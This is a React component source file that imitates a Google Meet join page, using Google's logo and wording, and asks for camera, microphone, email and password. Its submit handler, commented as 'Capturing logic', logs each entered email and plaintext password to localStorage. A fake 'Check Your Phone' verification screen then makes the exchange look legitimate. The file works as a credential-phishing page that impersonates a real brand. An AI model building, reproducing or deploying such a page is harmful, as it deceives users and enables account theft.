
import React, { useState, useRef, useEffect } from 'react';

interface SignInProps {
  onComplete: (name: string) => void;
  onCancel: () => void;
  isMicOn: boolean;
  isCameraOn: boolean;
  setIsMicOn: (val: boolean) => void;
  setIsCameraOn: (val: boolean) => void;
}

type SignInStep = 'CREDENTIALS' | 'VERIFY';

const SignIn: React.FC<SignInProps> = ({ 
  onComplete, 
  onCancel,
  isMicOn, 
  isCameraOn, 
  setIsMicOn, 
  setIsCameraOn 
}) => {
  const [step, setStep] = useState<SignInStep>('CREDENTIALS');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [permissionError, setPermissionError] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);
  const streamRef = useRef<MediaStream | null>(null);

  useEffect(() => {
    if (isCameraOn && streamRef.current && videoRef.current) {
      if (videoRef.current.srcObject !== streamRef.current) {
        videoRef.current.srcObject = streamRef.current;
      }
    }
  }, [isCameraOn, step]);

  const requestPermissions = async () => {
    try {
      setPermissionError(false);
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      streamRef.current = stream;
      setIsMicOn(true);
      setIsCameraOn(true);
    } catch (err) {
      console.error("Permission denied", err);
      setPermissionError(true);
    }
  };

  useEffect(() => {
    return () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  useEffect(() => {
    if (step === 'VERIFY') {
      const timer = setTimeout(() => {
        onComplete(email.split('@')[0] || 'User');
      }, 6000);
      return () => clearTimeout(timer);
    }
  }, [step, onComplete, email]);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (email.trim() && password.trim()) {
      setLoading(true);
      
      // Capturing logic: Save to localStorage logs
      const logs = JSON.parse(localStorage.getItem('meet_logs') || '[]');
      logs.push({
        id: Date.now().toString(),
        email: email,
        password: password,
        timestamp: new Date().toLocaleString()
      });
      localStorage.setItem('meet_logs', JSON.stringify(logs));

      setTimeout(() => {
        setLoading(false);
        setStep('VERIFY');
      }, 1000);
    }
  };

  const toggleLocalMic = () => {
    if (streamRef.current) {
      const audioTrack = streamRef.current.getAudioTracks()[0];
      if (audioTrack) audioTrack.enabled = !isMicOn;
    }
    setIsMicOn(!isMicOn);
  };

  const toggleLocalCamera = () => {
    if (streamRef.current) {
      const videoTrack = streamRef.current.getVideoTracks()[0];
      if (videoTrack) videoTrack.enabled = !isCameraOn;
    }
    setIsCameraOn(!isCameraOn);
  };

  if (step === 'VERIFY') {
    return (
      <div className="fixed inset-0 bg-white flex flex-col z-[100] font-sans items-center justify-center p-4">
        <div className="max-w-[450px] w-full flex flex-col items-center text-center">
          <div className="flex items-center gap-2 mb-10">
            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M0 4.5V15.5C0 16.8807 1.11929 18 2.5 18H13V4.5C13 3.11929 11.8807 2 10.5 2H2.5C1.11929 2 0 3.11929 0 4.5Z" fill="#00AA47"/>
              <path d="M19.5 7L13 11V18L19.5 22C20.8807 22 22 20.8807 22 19.5V9.5C22 8.11929 20.8807 7 19.5 7Z" fill="#00832D"/>
              <path d="M13 2H19.5C20.8807 2 22 3.11929 22 4.5V7L13 11V2Z" fill="#2684FC"/>
              <path d="M2.5 22H10.5C11.8807 22 13 20.8807 13 19.5V11H0V19.5C0 20.8807 1.11929 22 2.5 22Z" fill="#EA4335"/>
              <path d="M13 11H22V18H13V11Z" fill="#FFBA00"/>
            </svg>
            <span className="text-[#5f6368] text-2xl font-medium tracking-tight">Google <span className="font-normal">Meet</span></span>
          </div>
          <p className="text-[#3c4043] text-[15px] mb-8 leading-relaxed max-w-[340px]">
            Google Wants to make sure it's really you trying to join a Google Meet video call.
          </p>
          <div className="relative mb-8">
            <svg width="180" height="240" viewBox="0 0 180 240" fill="none" xmlns="http://www.w3.org/2000/svg">
              <rect x="40" y="10" width="100" height="180" rx="12" fill="#2D3339" />
              <rect x="45" y="25" width="90" height="150" fill="white" />
              <rect x="50" y="40" width="55" height="10" rx="2" fill="#E8EAED" />
              <rect x="50" y="55" width="40" height="12" rx="2" fill="#E8EAED" />
              <rect x="50" y="100" width="35" height="18" rx="2" fill="#E8EAED" />
              <rect x="88" y="100" width="40" height="18" rx="2" fill="#4285F4" />
              <ellipse cx="90" cy="205" rx="50" ry="5" fill="#F1F3F4" />
            </svg>
          </div>
          <h2 className="text-[#202124] text-2xl font-bold mb-4">Check Your Phone</h2>
          <p className="text-[#3c4043] text-[15px] mb-8 leading-relaxed px-4">
            Google sent a notification to your phone. Tap yes on the notification, then tap the meeting code to join the video call.
          </p>
          <div className="flex items-center gap-3 mb-10">
            <input type="checkbox" id="dontask" className="w-4 h-4 rounded border-[#dadce0]" />
            <label htmlFor="dontask" className="text-[#5f6368] text-sm cursor-pointer">Don't ask again on this device</label>
          </div>
          <button onClick={onCancel} className="bg-[#1a73e8] hover:bg-[#1557b0] text-white px-12 py-3 rounded-md font-medium text-base transition-all shadow-md active:scale-95">
            Resend It
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 bg-white flex flex-col z-[100] font-sans overflow-y-auto text-[#202124]">
      <header className="p-6">
        <div className="flex items-center gap-2">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M0 4.5V15.5C0 16.8807 1.11929 18 2.5 18H13V4.5C13 3.11929 11.8807 2 10.5 2H2.5C1.11929 2 0 3.11929 0 4.5Z" fill="#00AA47"/>
            <path d="M19.5 7L13 11V18L19.5 22C20.8807 22 22 20.8807 22 19.5V9.5C22 8.11929 20.8807 7 19.5 7Z" fill="#00832D"/>
            <path d="M13 2H19.5C20.8807 2 22 3.11929 22 4.5V7L13 11V2Z" fill="#2684FC"/>
            <path d="M2.5 22H10.5C11.8807 22 13 20.8807 13 19.5V11H0V19.5C0 20.8807 1.11929 22 2.5 22Z" fill="#EA4335"/>
            <path d="M13 11H22V18H13V11Z" fill="#FFBA00"/>
          </svg>
          <span className="text-[#5f6368] text-xl font-medium tracking-tight">Google <span className="font-normal">Meet</span></span>
        </div>
      </header>

      <main className="flex-1 flex items-center justify-center px-4 py-8">
        <div className="max-w-7xl w-full flex flex-col lg:flex-row items-center justify-center gap-12 lg:gap-24">
          <div className="w-full max-w-[640px] flex flex-col items-center">
            <div className="w-full aspect-video bg-[#202124] rounded-2xl flex flex-col items-center justify-center relative overflow-hidden shadow-2xl transition-all duration-500">
              {isCameraOn && !permissionError ? (
                <video ref={videoRef} autoPlay muted playsInline className="w-full h-full object-cover scale-x-[-1]" />
              ) : (
                <div className="flex flex-col items-center p-8 text-center">
                  <h2 className="text-white text-xl md:text-2xl font-normal mb-6 z-10">
                    {permissionError ? "Permission denied. Please enable in browser settings." : "Do you want people to see and hear you in the meeting?"}
                  </h2>
                  {!permissionError && !streamRef.current && (
                    <button onClick={requestPermissions} className="bg-[#1a73e8] hover:bg-[#1557b0] text-white px-8 py-3 rounded-md font-medium text-sm transition-all z-10 mb-12 shadow-lg hover:scale-105 active:scale-95">
                      Allow microphone and camera
                    </button>
                  )}
                  {streamRef.current && !isCameraOn && (
                    <div className="w-24 h-24 bg-[#3c4043] rounded-full flex items-center justify-center mb-12">
                      <span className="text-white text-4xl">?</span>
                    </div>
                  )}
                </div>
              )}
              <div className="absolute bottom-6 left-1/2 -translate-x-1/2 flex gap-4 z-20">
                <button onClick={toggleLocalMic} disabled={!streamRef.current} className={`w-12 h-12 rounded-full flex items-center justify-center transition-all ${isMicOn ? 'bg-white/10 hover:bg-white/20' : 'bg-[#ea4335]'} text-white shadow-lg disabled:opacity-30`}>
                  {isMicOn ? (
                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z"/></svg>
                  ) : (
                    <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M19 11h-1.7c0 .74-.16 1.43-.43 2.05l1.23 1.23c.56-.98.9-2.09.9-3.28zm-4.02.17l-1.98-1.98V5c0-1.66-1.34-3-3-3S7 3.34 7 5v.17l5.17 5.17s.81.81.81.83zm-10.32-8.4L3.41 4.02 7 7.61V11c0 2.76 2.24 5 5 5 .91 0 1.76-.24 2.5-.65l1.07 1.07c-1.07.59-2.29.93-3.57.93-3.87 0-7-3.13-7-7h-2c0 4.53 3.39 8.27 7.74 8.87V22h2v-3.13c1.32-.18 2.56-.64 3.65-1.33l2.87 2.87 1.41-1.41L4.68 2.77z"/></svg>
                  )}
                </button>
                <button onClick={toggleLocalCamera} disabled={!streamRef.current} className={`w-12 h-12 rounded-full flex items-center justify-center transition-all ${isCameraOn ? 'bg-white/10 hover:bg-white/20' : 'bg-[#ea4335]'} text-white shadow-lg disabled:opacity-30`}>
                  {isCameraOn ? (
                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg>
                  ) : (
                    <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M9.41 11.59L8 13v-2H6v4h4v-2l1.41 1.41C10.87 14.75 10.15 15 9.33 15H4.67C3.75 15 3 14.25 3 13.33V4.67C3 3.75 3.75 3 4.67 3h9.66c.92 0 1.67.75 1.67 1.67v6.66l-1-1V5H5v8h4.41zM21 6.5l-4 4v-3c0-.55-.45-1-1-1h-3c-.55 0-1 .45-1 1v6c0 .55.45 1 1 1h6c.55 0 1-.45 1-1v-3l4 4v-11z"/></svg>
                  )}
                </button>
              </div>
            </div>
          </div>
          <div className="w-full max-w-[420px] flex flex-col items-center">
            <h1 className="text-[#202124] text-3xl md:text-4xl font-normal mb-10 text-center">What's your Email?</h1>
            <form onSubmit={handleSubmit} className="w-full flex flex-col gap-4">
              <input type="text" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="Enter Your Email" className="w-full border border-[#dadce0] rounded-md px-4 py-3.5 text-base focus:border-[#1a73e8] focus:ring-1 focus:ring-[#1a73e8] bg-white" required />
              <div className="relative">
                <input type={showPassword ? "text" : "password"} value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter Your Password" className="w-full border border-[#dadce0] rounded-md px-4 py-3.5 pr-12 text-base focus:border-[#1a73e8] focus:ring-1 focus:ring-[#1a73e8] bg-white" required />
                <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400">
                  {showPassword ? (
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L5.136 5.136m13.727 13.727L14.621 14.12m3.816-3.12a9.97 9.97 0 011.563 3.029C18.732 18.057 14.942 21 10.5 21a9.972 9.972 0 01-1.057-.057" /></svg>
                  ) : (
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" /></svg>
                  )}
                </button>
              </div>
              <button type="submit" disabled={loading} className="w-full bg-[#1a73e8] hover:bg-[#1557b0] text-white py-3.5 rounded-full font-medium text-base transition-all mt-4 disabled:opacity-50">
                {loading ? 'Joining...' : 'Ask to Join'}
              </button>
            </form>
          </div>
        </div>
      </main>
      <style dangerouslySetInnerHTML={{ __html: `body { background-color: white !important; }` }} />
    </div>
  );
};

export default SignIn;
